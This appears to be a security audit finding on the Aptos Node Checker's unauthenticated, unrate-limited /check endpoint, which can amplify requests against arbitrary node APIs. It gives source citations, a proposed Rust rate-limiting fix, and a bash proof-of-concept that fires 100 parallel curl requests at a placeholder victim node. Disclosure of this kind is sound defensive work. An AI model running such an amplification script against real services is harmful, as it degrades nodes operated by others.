# Audit Report

## Title
Node Checker API Amplification DoS via Unauthenticated /check Endpoint

## Summary
The Aptos Node Checker service exposes an unauthenticated `/check` HTTP endpoint without rate limiting, enabling attackers to launch amplification-based denial-of-service attacks against arbitrary Aptos node API endpoints by repeatedly triggering health checks that generate multiple API requests to victim nodes.

## Finding Description

The node-checker service provides a public API endpoint `/check` that accepts user-supplied parameters to validate node health. [1](#0-0) 

This endpoint accepts arbitrary `node_url`, `baseline_configuration_id`, and port parameters without authentication. When invoked, it triggers the `SyncRunner` which executes multiple health checkers concurrently. [2](#0-1) 

The `TransactionCorrectnessChecker` specifically makes API calls to both the baseline and target nodes to retrieve transaction data and verify consistency. [3](#0-2) 

Each `/check` request triggers multiple API calls:
1. Multiple ledger version queries via `ApiIndexProvider` [4](#0-3) 
2. At least one `get_transaction_by_version_bcs` call to each node [5](#0-4) 
3. Additional checks depending on configuration

**Critical Security Gap:** The server implementation has no rate limiting, authentication, or concurrent request restrictions. [6](#0-5) 

**Attack Path:**
1. Attacker identifies node-checker service endpoint (e.g., `https://nhc.aptos.dev`)
2. Attacker crafts requests specifying victim node as `node_url` parameter
3. Attacker sends high-volume requests: `GET /check?baseline_configuration_id=mainnet&node_url=http://victim-node.com&api_port=8080`
4. Each request triggers 3-5+ API calls to victim node
5. Amplification factor: 1 attacker request â†’ N victim API requests
6. No rate limiting prevents unlimited attack duration

The API clients are created with only a 4-second timeout, which limits but does not prevent the attack. [7](#0-6) 

## Impact Explanation

**Severity: Low** (as indicated in the security question)

Per Aptos bug bounty categories, this qualifies as Low severity because:
- Does not affect consensus, funds, or validator operations
- Does not cause permanent or critical infrastructure damage
- Impact limited to API endpoint performance degradation
- Requires sustained attacker effort (not a one-shot exploit)

However, the vulnerability does enable:
- **Amplification attacks**: 1:N request multiplication
- **Resource exhaustion**: API connection pool depletion on victim nodes
- **Service degradation**: Increased latency for legitimate API users
- **Potential API crashes**: Under sustained high-volume attacks

The lack of authentication and rate limiting violates basic API security best practices (Resource Limits invariant #9: "All operations must respect gas, storage, and computational limits").

## Likelihood Explanation

**Likelihood: High**

Exploitation is trivial:
- No authentication required
- Simple HTTP GET requests
- Publicly accessible endpoint
- No technical sophistication needed
- Attack can be automated with basic scripts
- Multiple public node-checker instances likely exist

Mitigating factors:
- 4-second request timeout reduces per-request impact
- Attacker must maintain sustained request rate
- Target nodes may have their own rate limiting

## Recommendation

Implement multi-layer rate limiting and authentication:

```rust
// In ecosystem/node-checker/src/server/run.rs
use poem::middleware::RateLimiter;
use std::num::NonZeroU32;

pub async fn run(args: Run) -> Result<()> {
    // ... existing setup code ...
    
    // Add rate limiter: 10 requests per IP per minute
    let rate_limiter = RateLimiter::new(
        std::time::Duration::from_secs(60),
        NonZeroU32::new(10).unwrap()
    );
    
    Server::new(TcpListener::bind((
        args.server_args.listen_address,
        args.server_args.listen_port,
    )))
    .run(
        Route::new()
            .nest(api_endpoint, api_service)
            .nest("/spec", ui)
            .at("/spec.json", spec_json)
            .at("/spec.yaml", spec_yaml)
            .with(cors)
            .with(rate_limiter) // Add rate limiting middleware
    )
    .await
    .map_err(anyhow::Error::msg)
}
```

Additional recommendations:
1. **IP-based rate limiting**: Limit requests per IP address
2. **API key authentication**: Require API keys for legitimate users
3. **Concurrent request limits**: Use semaphore to limit total concurrent checks
4. **Target URL allowlist**: Optionally restrict which nodes can be checked
5. **Request logging**: Monitor for abuse patterns

## Proof of Concept

```bash
#!/bin/bash
# PoC: Amplification DoS against node API via node-checker

NODE_CHECKER_URL="https://nhc-example.aptos.dev/check"
VICTIM_NODE="http://victim-node.aptos.example.com"
BASELINE_CONFIG="mainnet_fullnode"

# Single amplified request
echo "Sending single amplified request..."
curl -v "${NODE_CHECKER_URL}?node_url=${VICTIM_NODE}&api_port=8080&baseline_configuration_id=${BASELINE_CONFIG}"

# Sustained attack (100 requests in parallel)
echo "Launching sustained attack..."
for i in {1..100}; do
    curl -s "${NODE_CHECKER_URL}?node_url=${VICTIM_NODE}&api_port=8080&baseline_configuration_id=${BASELINE_CONFIG}" &
done
wait

echo "Attack complete. Each request triggered 3-5 API calls to victim node."
echo "Total amplified requests: 300-500 API calls to victim from 100 attacker requests."
```

Expected behavior:
1. Each `/check` request completes in ~5-10 seconds
2. Victim node receives multiple concurrent API requests
3. No rate limiting prevents repeated execution
4. Connection pools and API handlers on victim node become saturated
5. Legitimate users experience degraded API performance

## Notes

- This vulnerability is specific to the node-checker service deployment, not core blockchain functionality
- The issue exists in the operational tooling layer, not consensus/execution layers
- Proper deployment with reverse proxy rate limiting (nginx, CloudFlare) would mitigate this
- However, defense-in-depth requires application-level rate limiting as well
- The baseline nodes (mainnet, testnet) are also potential victims of amplification attacks

### Citations

**File:** ecosystem/node-checker/src/server/api.rs (L29-45)
```rust
    #[oai(path = "/check", method = "get")]
    async fn check(
        &self,
        /// The ID of the baseline node configuration to use for the evaluation, e.g. devnet_fullnode
        baseline_configuration_id: Query<String>,
        /// The URL of the node to check, e.g. http://44.238.19.217 or http://fullnode.mysite.com
        node_url: Query<Url>,
        /// If given, we will assume the metrics service is available at the given port.
        metrics_port: Query<Option<u16>>,
        /// If given, we will assume the API is available at the given port.
        api_port: Query<Option<u16>>,
        /// If given, we will assume that clients can communicate with your node via noise at the given port.
        noise_port: Query<Option<u16>>,
        /// A public key for the node, e.g. 0x44fd1324c66371b4788af0b901c9eb8088781acb29e6b8b9c791d5d9838fbe1f.
        /// This is only necessary for certain checkers, e.g. HandshakeChecker.
        public_key: Query<Option<String>>,
    ) -> poem::Result<Json<CheckSummary>> {
```

**File:** ecosystem/node-checker/src/server/api.rs (L89-92)
```rust
        let complete_evaluation_result = baseline_configuration
            .runner
            .run(&target_node_address)
            .await;
```

**File:** ecosystem/node-checker/src/checker/transaction_correctness.rs (L34-52)
```rust
    async fn get_transaction_by_version(
        client: &AptosRestClient,
        version: u64,
        node_name: &str,
    ) -> Result<TransactionData, CheckerError> {
        Ok(client
            .get_transaction_by_version_bcs(version)
            .await
            .map_err(|e| {
                CheckerError::NonRetryableEndpointError(
                    TRANSACTIONS_ENDPOINT,
                    anyhow::Error::from(e).context(format!(
                        "The {} node API failed to return the requested transaction at version: {}",
                        node_name, version
                    )),
                )
            })?
            .into_inner())
    }
```

**File:** ecosystem/node-checker/src/checker/transaction_correctness.rs (L94-111)
```rust
        let oldest_baseline_version = baseline_api_index_provider
            .provide()
            .await?
            .oldest_ledger_version
            .0;
        let oldest_target_version = match target_api_index_provider.provide().await {
            Ok(response) => response.oldest_ledger_version.0,
            Err(err) => {
                return Ok(vec![Self::build_result(
                    "Failed to determine oldest ledger version of your node".to_string(),
                    0,
                    format!(
                        "There was an error querying your node's API (1st time): {:#}",
                        err
                    ),
                )]);
            },
        };
```

**File:** ecosystem/node-checker/src/checker/transaction_correctness.rs (L173-186)
```rust
        let middle_baseline_transaction = Self::get_transaction_by_version(
            &baseline_api_index_provider.client,
            middle_shared_version,
            "baseline",
        )
        .await?;
        let middle_baseline_accumulator_root_hash =
            Self::unwrap_accumulator_root_hash(&middle_baseline_transaction)?;

        let evaluation = match Self::get_transaction_by_version(
            &target_api_index_provider.client,
            middle_shared_version,
            "latest",
        )
```

**File:** ecosystem/node-checker/src/server/run.rs (L51-66)
```rust
    let cors = Cors::new().allow_methods(vec![Method::GET]);

    Server::new(TcpListener::bind((
        args.server_args.listen_address,
        args.server_args.listen_port,
    )))
    .run(
        Route::new()
            .nest(api_endpoint, api_service)
            .nest("/spec", ui)
            .at("/spec.json", spec_json)
            .at("/spec.yaml", spec_yaml)
            .with(cors),
    )
    .await
    .map_err(anyhow::Error::msg)
```

**File:** ecosystem/node-checker/src/runner/sync_runner.rs (L122-127)
```rust
        if let Ok(api_client) = target_node_address.get_api_client(Duration::from_secs(4)) {
            let api_index_provider = Arc::new(ApiIndexProvider::new(
                self.provider_configs.api_index.clone(),
                api_client,
            ));
            provider_collection.target_api_index_provider = Some(api_index_provider.clone());
```
